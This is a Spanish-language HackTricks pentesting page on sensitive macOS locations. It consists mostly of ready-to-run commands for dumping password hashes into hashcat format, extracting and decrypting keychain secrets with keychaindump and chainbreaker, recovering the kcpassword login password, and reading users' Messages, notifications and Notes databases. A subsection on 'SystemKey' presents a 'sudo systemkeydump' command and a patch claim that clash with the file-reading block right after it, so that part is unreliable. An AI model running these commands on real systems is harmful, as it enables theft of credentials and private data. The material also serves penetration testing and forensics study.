# Ubicaciones Sensibles de macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Contraseñas

### Contraseñas Shadow

La contraseña Shadow se almacena con la configuración del usuario en plists ubicados en **`/var/db/dslocal/nodes/Default/users/`**.\
El siguiente comando se puede utilizar para volcar **toda la información sobre los usuarios** (incluida la información de hash):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Scripts como este**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) o [**este otro**](https://github.com/octomagon/davegrohl.git) se pueden utilizar para transformar el hash al **formato hashcat**.

Una alternativa en una sola línea que volcará las credenciales de todas las cuentas no de servicio en formato hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Volcado de llavero

Tenga en cuenta que al utilizar el binario de seguridad para **volcar las contraseñas descifradas**, se le pedirá al usuario que permita esta operación en varias ocasiones.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Basado en este comentario [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) parece que estas herramientas ya no funcionan en Big Sur.
{% endhint %}

El atacante aún necesita obtener acceso al sistema y escalar los privilegios a **root** para ejecutar **keychaindump**. Este enfoque viene con sus propias condiciones. Como se mencionó anteriormente, **al iniciar sesión, su llavero se desbloquea por defecto** y permanece desbloqueado mientras usa su sistema. Esto es para su conveniencia para que el usuario no tenga que ingresar su contraseña cada vez que una aplicación desee acceder al llavero. Si el usuario ha cambiado esta configuración y ha elegido bloquear el llavero después de cada uso, keychaindump ya no funcionará; depende de un llavero desbloqueado para funcionar.

Es importante entender cómo Keychaindump extrae contraseñas de la memoria. El proceso más importante en esta transacción es el "**securityd**" **proceso**. Apple se refiere a este proceso como un **daemon de contexto de seguridad para operaciones de autorización y criptográficas**. Las bibliotecas de desarrolladores de Apple no dicen mucho al respecto; sin embargo, nos dicen que securityd maneja el acceso al llavero. En su investigación, Juuso se refiere a la **clave necesaria para descifrar el llavero como "La Clave Maestra"**. Se deben tomar una serie de pasos para adquirir esta clave ya que se deriva de la contraseña de inicio de sesión de OS X del usuario. Si desea leer el archivo del llavero, debe tener esta clave maestra. Los siguientes pasos se pueden realizar para adquirirla. **Realice un escaneo del heap de securityd (keychaindump lo hace con el comando vmmap)**. Las posibles claves maestras se almacenan en un área marcada como MALLOC\_TINY. Puede ver las ubicaciones de estos heaps usted mismo con el siguiente comando:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
**Keychaindump** buscará en los montones devueltos las ocurrencias de 0x0000000000000018. Si el siguiente valor de 8 bytes apunta al montón actual, hemos encontrado una posible clave maestra. A partir de aquí, todavía es necesario realizar un poco de desofuscación que se puede ver en el código fuente, pero como analista, la parte más importante a tener en cuenta es que los datos necesarios para descifrar esta información se almacenan en la memoria del proceso de securityd. Aquí hay un ejemplo de la salida de keychain dump.
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) se puede utilizar para extraer los siguientes tipos de información de un llavero OSX de manera forense:

* Contraseña de llavero con hash, adecuada para descifrar con [hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/)
* Contraseñas de Internet
* Contraseñas genéricas
* Claves privadas
* Claves públicas
* Certificados X509
* Notas seguras
* Contraseñas de Appleshare

Dado la contraseña de desbloqueo del llavero, una clave maestra obtenida usando [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), o un archivo de desbloqueo como SystemKey, Chainbreaker también proporcionará contraseñas en texto plano.

Sin uno de estos métodos para desbloquear el llavero, Chainbreaker mostrará toda la información disponible. 

### **Volcar claves de llavero**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
### **Volcar claves del llavero (con contraseñas) con SystemKey**

Para volcar las claves del llavero de un usuario (incluyendo contraseñas) en macOS, se puede utilizar la herramienta SystemKey. Esta herramienta se utiliza para acceder a la memoria del sistema y extraer información sensible, como claves de cifrado y contraseñas.

Para utilizar SystemKey, primero se debe obtener acceso de root en el sistema. Una vez que se tenga acceso de root, se puede ejecutar el siguiente comando para volcar las claves del llavero:

```
sudo systemkeydump
```

Este comando volcará todas las claves del llavero del usuario actual, incluyendo las contraseñas almacenadas en el llavero. Es importante tener en cuenta que este comando solo funciona en sistemas macOS antiguos (anterior a macOS Sierra 10.12.2), ya que Apple ha parcheado esta vulnerabilidad en versiones más recientes del sistema operativo.

Es importante tener en cuenta que la extracción de claves del llavero sin el consentimiento del propietario del sistema es ilegal y puede resultar en consecuencias legales graves. Este método solo debe ser utilizado con fines de prueba de penetración en sistemas autorizados.
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Volcado de claves del llavero (con contraseñas) rompiendo el hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Volcado de claves del llavero (con contraseñas) con volcado de memoria**

[Siga estos pasos](..#volcado-de-memoria-con-osxpmem) para realizar un **volcado de memoria**.
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Volcar claves del llavero (con contraseñas) usando la contraseña del usuario**

Si conoces la contraseña del usuario, puedes usarla para **volcar y descifrar los llaveros que pertenecen al usuario**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

El archivo **kcpassword** es un archivo que contiene la **contraseña de inicio de sesión del usuario**, pero solo si el propietario del sistema ha **habilitado el inicio de sesión automático**. Por lo tanto, el usuario iniciará sesión automáticamente sin que se le solicite una contraseña (lo que no es muy seguro).

La contraseña se almacena en el archivo **`/etc/kcpassword`** xored con la clave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si la contraseña del usuario es más larga que la clave, la clave se reutilizará.\
Esto hace que la contraseña sea bastante fácil de recuperar, por ejemplo, usando scripts como [**este**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Información interesante en bases de datos

### Mensajes
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notificaciones

Puedes encontrar los datos de Notificaciones en `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

La mayoría de la información interesante estará en **blob**. Por lo tanto, necesitarás **extraer** ese contenido y **transformarlo** en algo **legible** para humanos o usar **`strings`**. Para acceder a él, puedes hacer lo siguiente:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Notas

Las **notas** de los usuarios se pueden encontrar en `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
